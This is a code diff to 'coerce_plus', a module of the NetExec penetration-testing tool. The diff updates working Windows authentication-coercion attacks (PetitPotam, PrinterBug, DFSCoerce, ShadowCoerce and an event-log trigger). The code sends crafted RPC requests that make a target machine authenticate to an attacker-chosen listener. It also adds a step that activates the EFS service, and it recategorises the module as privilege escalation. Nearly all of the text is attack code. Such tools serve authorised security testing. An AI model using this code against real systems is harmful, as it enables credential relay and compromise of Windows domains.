@@ -1,18 +1,17 @@
-from impacket import uuid
 from impacket.dcerpc.v5 import transport, rprn, even, epm
 from impacket.dcerpc.v5.ndr import NDRCALL, NDRSTRUCT, NDRPOINTER, NDRUniConformantArray, NDRPOINTERNULL
 from impacket.dcerpc.v5.dtypes import LPBYTE, USHORT, LPWSTR, DWORD, ULONG, NULL, WSTR, LONG, BOOL, PCHAR, RPC_SID
 from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
-
 from impacket.uuid import uuidtup_to_bin
+from nxc.helpers.misc import CATEGORY
+import contextlib
 
 
 class NXCModule:
     name = "coerce_plus"
     description = "Module to check if the Target is vulnerable to any coerce vulns. Set LISTENER IP for coercion."
     supported_protocols = ["smb"]
-    opsec_safe = True
-    multiple_hosts = True
+    category = CATEGORY.PRIVILEGE_ESCALATION
 
     def __init__(self, context=None, module_options=None):
         self.context = context
@@ -213,6 +212,15 @@ class NXCModule:
             context.log.error("Invalid method, please check the method name.")
             return
 
+    @staticmethod
+    def get_dynamic_endpoint(interface: bytes, target: str, timeout: int = 5) -> str:
+        string_binding = rf"ncacn_ip_tcp:{target}[135]"
+        rpctransport = transport.DCERPCTransportFactory(string_binding)
+        rpctransport.set_connect_timeout(timeout)
+        dce = rpctransport.get_dce_rpc()
+        dce.connect()
+        return epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)
+
 
 class ShadowCoerceTrigger:
     def __init__(self, context):
@@ -221,7 +229,7 @@ class ShadowCoerceTrigger:
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "Fssagentrpc": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\Fssagentrpc]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\Fssagentrpc]",
                 "MSRPC_UUID_FSRVP": ("a8e0653c-2744-4389-a61d-7373df8b2292", "3.0"),
             },
         }
@@ -338,7 +346,7 @@ class DFSCoerceTrigger:
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "netdfs": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\netdfs]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\netdfs]",
                 "MSRPC_UUID_DFSNM": ("4fc742e0-4a10-11cf-8273-00aa004ae673", "3.0"),
             },
         }
@@ -389,8 +397,8 @@ class DFSCoerceTrigger:
             """
             request["ServerName"] = f"{listener}\x00"
             request["RootShare"] = "test\x00"
-            request["Comment"] = "lodos\x00"
-            request["Share"] = "x:\\lodos2005\x00"
+            request["Comment"] = "test\x00"
+            request["Share"] = "x:\\test\x00"
 
             dce.request(request)
         except Exception as e:
@@ -411,7 +419,7 @@ class DFSCoerceTrigger:
             request["pDfsPath"] = f"\\\\{listener}\\a\x00"
             request["pTargetPath"] = NULL
             request["MajorVersion"] = 0
-            request["pComment"] = "lodos\x00"
+            request["pComment"] = "test\x00"
             request["NewNamespace"] = 0
             request["Flags"] = 0
             dce.request(request)
@@ -474,7 +482,7 @@ class DFSCoerceTrigger:
             request = NetrDfsAddStdRoot()
             request["ServerName"] = f"{listener}\x00"
             request["RootShare"] = "test\x00"
-            request["Comment"] = "lodos\x00"
+            request["Comment"] = "test\x00"
             request["ApiFlags"] = 0
             dce.request(request)
         except Exception as e:
@@ -509,26 +517,31 @@ class PetitPotamtTrigger:
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "lsarpc": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\lsarpc]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\lsarpc]",
                 "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
             },
             "efsrpc": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\efsrpc]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\efsrpc]",
                 "MSRPC_UUID_EFSR": ("df1941c5-fe89-4e79-bf10-463657acf44d", "1.0"),
             },
             "samr": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\samr]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\samr]",
                 "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
             },
             "lsass": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\lsass]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\lsass]",
                 "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
             },
             "netlogon": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\netlogon]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\netlogon]",
                 "MSRPC_UUID_EFSR": ("c681d488-d850-11d0-8c52-00c04fd90f7e", "1.0"),
             },
         }
+
+        # activates EFS
+        # https://specterops.io/blog/2025/08/19/will-webclient-start/
+        with contextlib.suppress(Exception):
+            NXCModule.get_dynamic_endpoint(uuidtup_to_bin(("df1941c5-fe89-4e79-bf10-463657acf44d", "0.0")), target, timeout=1)
 
         rpctransport = transport.DCERPCTransportFactory(binding_params[pipe]["stringBinding"])
         rpctransport.set_dport(445)
@@ -757,42 +770,15 @@ class PrinterBugTrigger:
     def __init__(self, context):
         self.context = context
 
-    def get_dynamic_endpoint(self, interface: bytes, target: str, timeout: int = 5) -> str:
-        string_binding = r"ncacn_ip_tcp:%s[135]" % target
-        rpctransport = transport.DCERPCTransportFactory(string_binding)
-        rpctransport.set_connect_timeout(timeout)
-        dce = rpctransport.get_dce_rpc()
-        self.context.log.debug(
-            "Trying to resolve dynamic endpoint %s" % repr(uuid.bin_to_string(interface))
-        )
-        try:
-            dce.connect()
-        except Exception as e:
-            self.context.log.warning("Failed to connect to endpoint mapper: %s" % e)
-            raise e
-        try:
-            endpoint = epm.hept_map(target, interface, protocol="ncacn_ip_tcp", dce=dce)
-            self.context.log.debug(
-                f"Resolved dynamic endpoint {uuid.bin_to_string(interface)!r} to {endpoint!r}"
-            )
-            return endpoint
-        except Exception as e:
-            self.context.log.debug(
-                "Failed to resolve dynamic endpoint %s"
-                % repr(uuid.bin_to_string(interface))
-            )
-            raise e
-
-
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "spoolss": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\spoolss]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\spoolss]",
                 "MSRPC_UUID_RPRN": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                 "port": 445
             },
             "[dcerpc]": {
-                "stringBinding": self.get_dynamic_endpoint(uuidtup_to_bin(("12345678-1234-abcd-ef00-0123456789ab", "1.0")), target),
+                "stringBinding": NXCModule.get_dynamic_endpoint(uuidtup_to_bin(("12345678-1234-abcd-ef00-0123456789ab", "1.0")), target),
                 "MSRPC_UUID_RPRN": ("12345678-1234-abcd-ef00-0123456789ab", "1.0"),
                 "port": None
             }
@@ -835,7 +821,7 @@ class PrinterBugTrigger:
 
     def exploit(self, dce, listener, target, always_continue, pipe):
         try:
-            resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % target)
+            resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
         except Exception as e:
             if str(e).find("Broken pipe") >= 0:
                 # The connection timed-out. Let's try to bring it back next round
@@ -853,7 +839,7 @@ class PrinterBugTrigger:
             request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
             request["hPrinter"] = resp["pHandle"]
             request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
-            request["pszLocalMachine"] = "\\\\%s\x00" % listener
+            request["pszLocalMachine"] = f"\\\\{listener}\x00"
             request["fdwOptions"] = 0x00000000
             request["dwPrinterLocal"] = 0
             dce.request(request)
@@ -885,7 +871,7 @@ class PrinterBugTrigger:
             request = RpcRemoteFindFirstPrinterChangeNotification()
             request["hPrinter"] = resp["pHandle"]
             request["fdwFlags"] = rprn.PRINTER_CHANGE_ADD_JOB
-            request["pszLocalMachine"] = "\\\\%s\x00" % listener
+            request["pszLocalMachine"] = f"\\\\{listener}\x00"
             request["fdwOptions"] = 0x00000000
             request["dwPrinterLocal"] = 0
             request["cbBuffer"] = NULL
@@ -908,7 +894,7 @@ class MSEvenTrigger:
     def connect(self, username, password, domain, lmhash, nthash, aesKey, target, doKerberos, dcHost, pipe):
         binding_params = {
             "eventlog": {
-                "stringBinding": r"ncacn_np:%s[\PIPE\eventlog]" % target,
+                "stringBinding": rf"ncacn_np:{target}[\PIPE\eventlog]",
                 "MSRPC_UUID_EVEN": ("82273fdc-e32a-18c3-3f78-827929dc23ea", "0.0"),
             },
         }
